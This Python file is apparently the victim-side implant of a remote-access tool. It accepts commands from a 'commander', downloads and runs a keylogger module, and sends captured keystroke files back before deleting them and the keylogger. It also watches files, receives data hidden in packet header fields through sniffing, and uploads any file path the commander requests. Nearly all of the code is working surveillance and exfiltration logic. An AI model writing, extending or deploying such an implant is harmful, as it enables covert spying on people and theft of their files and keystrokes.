import base64
import string
import threading
import time

from scapy.layers.inet import IP
from scapy.sendrecv import sniff

from victim_utils import *

if __name__ == '__main__':
    # GetOpts arguments
    source_ip, source_port = parse_arguments()

    # Initialize server socket
    server_socket = initialize_server_socket(source_ip, source_port)

    while True:
        print(constants.WAIT_CONNECTION_MSG)
        client_socket, client_address = server_socket.accept()
        print("[+] Accepted connection from {}:{}".format(*client_address))
        print(constants.MENU_CLOSING_BANNER)

        try:
            while True:
                # Receive data from the client
                data = client_socket.recv(1024)
                if not data:
                    print(constants.CLIENT_DISCONNECT_MSG.format(client_address[0], client_address[1]))
                    break

                # a) Command to start/stop keylogger program
                if data.decode() == constants.START_KEYLOG_MSG:
                    print(constants.START_KEYLOGGER_PROMPT)
                    client_socket.send(constants.RECEIVED_CONFIRMATION_MSG.encode())

                    # Receive command and filename from commander
                    command = client_socket.recv(1024).decode()
                    file_name = client_socket.recv(1024).decode()
                    print(constants.RECEIVE_FILE_NAME_PROMPT.format(file_name))

                    if command == constants.CHECK_KEYLOG:
                        print(constants.DO_CHECK_MSG.format(file_name))

                        # Get the current working directory
                        current_directory = os.getcwd()

                        # Create the full path to the file by joining the directory and file name
                        file_path = os.path.join(current_directory, file_name)

                        # Check if the file exists
                        if os.path.exists(file_path):
                            print(constants.FILE_FOUND_MSG.format(file_name))
                            client_socket.send(constants.STATUS_TRUE.encode())
                            client_socket.send(constants.FILE_FOUND_MSG_TO_COMMANDER.format(file_name).encode())

                            # Await signal to start
                            signal_start = client_socket.recv(1024).decode()

                            # Start Keylogger
                            if signal_start == constants.START_KEYLOG_MSG:
                                print(constants.EXECUTE_KEYLOG_MSG.format(file_name))
                                client_socket.send(constants.EXECUTE_KEYLOG_MSG_TO_CMDR.format(file_name).encode())
                                module_name = file_name[:(len(file_name)) - 3]

                                # Set global signal and start a thread to watch (prevents recv() blocking)
                                signal_queue = queue.Queue()
                                watcher_thread = threading.Thread(target=watch_stop_signal, args=(client_socket,
                                                                                                  signal_queue,))
                                watcher_thread.daemon = True
                                watcher_thread.start()

                                # Check if able import downloaded keylogger module
                                if is_importable(module_name):
                                    keylogger = importlib.import_module(module_name)
                                    file_name = keylogger.main(signal_queue)

                                    # Ensure thread closes and does not stall program
                                    watcher_thread.join()

                                    # Print status and send to commander
                                    print(constants.KEYLOG_SUCCESS_MSG.format(file_name))
                                    parsed_msg = (constants.STATUS_TRUE + "/" + constants.KEYLOG_SUCCESS_MSG_TO_CMDR.
                                                  format(file_name))
                                    client_socket.send(parsed_msg.encode())
                                else:
                                    client_socket.send(constants.STATUS_FALSE.encode())
                                    parsed_msg = (constants.STATUS_FALSE + "/" + constants.FAILED_IMPORT_MSG
                                                  .format(module_name))
                                    client_socket.send(parsed_msg.encode())
                        else:
                            print(constants.FILE_NOT_FOUND_ERROR.format(file_name))
                            status = client_socket.send(constants.STATUS_FALSE.encode())
                            msg = client_socket.send(constants.FILE_NOT_FOUND_TO_CMDR_ERROR.format(file_name).encode())

                # b) Command to GET keylog program from commander
                if data.decode() == constants.GET_KEYLOGGER_MSG:
                    print(constants.CLIENT_RESPONSE.format(constants.GET_KEYLOGGER_MSG))

                    # Send an initial acknowledgement to the client (giving them green light for transfer)
                    client_socket.send(constants.RECEIVED_CONFIRMATION_MSG.encode())

                    # Call to receive the file data and checksum from the client
                    filename = client_socket.recv(1024).decode()
                    print(constants.RECEIVING_FILE_MSG.format(filename))

                    with open(filename, constants.WRITE_BINARY_MODE) as file:
                        eof_marker = constants.FILE_END_OF_FILE_SIGNAL  # Define the end-of-file marker

                        while True:
                            file_data = client_socket.recv(1024)
                            if not file_data:
                                break  # No more data received
                            if file_data.endswith(eof_marker):
                                file.write(file_data[:-len(eof_marker)])  # Exclude the end-of-file marker
                                break
                            else:
                                file.write(file_data)

                    # Send ACK to commander (if good)
                    if is_file_openable(filename):
                        print(constants.TRANSFER_SUCCESS_MSG.format(filename))
                        client_socket.send(constants.VICTIM_ACK.encode())
                    else:
                        client_socket.send(constants.FILE_CANNOT_OPEN_TO_SENDER.encode())

                # c) Check if data is to send recorded keystroked file to commander
                if data.decode() == constants.TRANSFER_KEYLOG_FILE_MSG:
                    print(constants.CLIENT_RESPONSE.format(data.decode()))
                    print(constants.GET_KEYLOG_REQUEST_MSG)
                    print(constants.GET_KEYLOG_CHECK_MSG)

                    # Get the current directory
                    current_directory = os.getcwd()

                    # List all files in the current directory
                    files_in_directory = os.listdir(current_directory)

                    # Check if there are any .txt files
                    txt_files = [file for file in files_in_directory if file.endswith('.txt')]

                    if txt_files:
                        print(constants.SEARCH_FILES_SUCCESSFUL_MSG.format(len(txt_files)))
                        client_socket.send(constants.SEARCH_FILES_SUCCESSFUL_SEND.format(len(txt_files)).encode())

                        # WAIT FOR ACK
                        res = client_socket.recv(200).decode()

                        # Send number of files to commander
                        client_socket.send(str(len(txt_files)).encode())

                        # WAIT FOR ACK
                        client_socket.recv(200)

                        # Send file(s) in current directory
                        for file_name in txt_files:
                            client_socket.send(file_name.encode())

                            with open(file_name, 'rb') as file:
                                while True:
                                    data = file.read(1024)
                                    if not data:
                                        break
                                    client_socket.send(data)

                            # Send EOF signal to prevent receiver's recv() from blocking
                            client_socket.send(constants.FILE_END_OF_FILE_SIGNAL)

                            # Get an ACK from victim for success
                            transfer_result = client_socket.recv(1024).decode()

                            # Delete .txt keylog file after successful transfer
                            if transfer_result == constants.VICTIM_ACK:
                                print(constants.FILE_TRANSFER_SUCCESSFUL.format(file_name,
                                                                                client_address[0],
                                                                                client_address[1]))
                                # Delete .txt file
                                delete_file(file_name)
                            else:
                                print(constants.FILE_TRANSFER_ERROR.format(transfer_result))

                        # Delete keylogger.py from client/victim
                        delete_file(constants.KEYLOG_FILE_NAME)
                    else:
                        # If no .txt keylog files present
                        print(constants.SEARCH_FILES_ERROR_MSG)
                        client_socket.send(constants.SEARCH_FILES_ERROR_SEND.encode())

                # d) WATCH FILE
                if data.decode() == constants.WATCH_FILE_SIGNAL:
                    print("[+] Client says: {}".format(constants.WATCH_FILE_SIGNAL))

                    # Get file name from client
                    file_path = client_socket.recv(1024).decode()
                    print("[+] Client has requested to watch the following file (path): {}".format(file_path))

                    # Check if file exists (in a given path) + Apply logic
                    if os.path.exists(file_path):
                        print(constants.WATCH_FILE_EXISTS_MSG.format(file_path))
                        client_socket.send((constants.STATUS_TRUE + "/" +
                                            constants.WATCH_FILE_EXISTS_MSG_TO_CMDR.format(file_path)).encode())

                        # Open a separate thread to monitor commander socket (prevent recv() from program hanging)
                        signal_queue = queue.Queue()
                        watch_stop_thread = threading.Thread(target=watch_stop_signal,
                                                             args=(client_socket,
                                                                   signal_queue),
                                                             name="Watch_Stop_Signal")
                        watch_stop_thread.daemon = True
                        watch_stop_thread.start()
                        print(constants.THREAD_START_MSG.format(watch_stop_thread.name))

                        # Send to the commander whenever the file has an event
                        watch_file(client_socket, file_path, signal_queue)

                        # Close Watch Stop Thread
                        watch_stop_thread.join()
                        print(constants.WATCH_FILE_STOPPED)
                    else:
                        print(constants.WATCH_FILE_NOT_EXIST_MSG.format(file_path))
                        client_socket.send((constants.STATUS_FALSE + "/" +
                                            constants.WATCH_FILE_NOT_EXIST_TO_CMDR.format(file_path)).encode())



                # e) Receive File from Commander (Covert Channel)
                if data.decode() == constants.TRANSFER_FILE_SIGNAL:
                    print(constants.CLIENT_RESPONSE.format(constants.TRANSFER_FILE_SIGNAL))

                    # Send an initial acknowledgement to the client (giving them green light for transfer)
                    client_socket.send(constants.RECEIVED_CONFIRMATION_MSG.encode())

                    # Get configuration from commander (filename, header, header_field)
                    res = client_socket.recv(1024).decode().split("/")
                    filename = res[0]
                    choices = (res[1], res[2])  # => (header, header_field)

                    # Print configuration
                    print(constants.RECEIVING_FILE_MSG.format(filename))
                    print(constants.COVERT_CONFIGURATION_FROM_CMDR.format(choices[0], choices[1]))
                    print(constants.COVERT_DATA_PACKET_LOCATION_MSG.format(choices[0], choices[1]))

                    # Get total count of packets
                    count = int(client_socket.recv(1024).decode())
                    print(constants.CLIENT_RESPONSE.format(constants.CLIENT_TOTAL_PACKET_COUNT_MSG.format(count)))

                    # Get function handler from a map (according to header/field)
                    header_field_function_map = get_protocol_header_function_map()
                    if choices in header_field_function_map:
                        selected_function = header_field_function_map.get(choices)

                    # A callback function for handling of received packets
                    def packet_callback(packet):
                        global filename
                        binary_data = selected_function(packet)

                        if binary_data:
                            text_data = bin_to_text(binary_data)
                            with open(filename, constants.APPEND_MODE) as f:
                                f.write(text_data)

                    # Start sniffing for a specific number of packets
                    sniff(filter="src host {}".format(client_address[0]), prn=packet_callback, count=count)

                    # # Send ACK to commander (if good)
                    if is_file_openable(filename):
                        print(constants.TRANSFER_SUCCESS_MSG.format(filename))
                        client_socket.send(constants.VICTIM_ACK.encode())
                    else:
                        client_socket.send(constants.FILE_CANNOT_OPEN_TO_SENDER.encode())


                # f) Transfer file to Commander
                if data.decode() == constants.GET_FILE_SIGNAL:
                    print(constants.CLIENT_RESPONSE.format(constants.GET_FILE_SIGNAL))

                    # Send ACK
                    client_socket.send(constants.RECEIVED_CONFIRMATION_MSG.encode())

                    # Receive File Path
                    file_path = client_socket.recv(1024).decode()
                    print(constants.GET_FILE_CMDR_PATH.format(file_path))
                    print(constants.GET_FILE_INIT_TRANSFER)

                    # If exists, then initiate file transfer
                    if os.path.exists(file_path):
                        client_socket.send(constants.GET_FILE_EXIST.encode())

                        # Wait for client/victim to buffer
                        time.sleep(1)

                        with open(file_path, 'rb') as file:
                            while True:
                                data = file.read(1024)
                                if not data:
                                    break
                                client_socket.send(data)

                        # Send EOF signal to prevent receiver's recv() from blocking
                        client_socket.send(constants.FILE_END_OF_FILE_SIGNAL)

                        # Get an ACK from victim for success
                        transfer_result = client_socket.recv(1024).decode()

                        if transfer_result == constants.VICTIM_ACK:
                            print(constants.FILE_TRANSFER_SUCCESSFUL.format(file_path,
                                                                            client_address[0],
                                                                            client_address[1]))
                        else:
                            print(constants.FILE_TRANSFER_ERROR.format(transfer_result))
                    else:
                        client_socket.send(constants.GET_FILE_NOT_EXIST.encode())
                        print(constants.FILE_NOT_FOUND_ERROR.format(file_path))

        except ConnectionResetError:
            print("[+] The client {}:{} disconnected unexpectedly.".format(client_address[0], client_address[1]))
        except KeyboardInterrupt:
            print("[+] Victim is shutting down...")
            break
        except Exception as e:
            print("[+] An error occurred: {}".format(e))
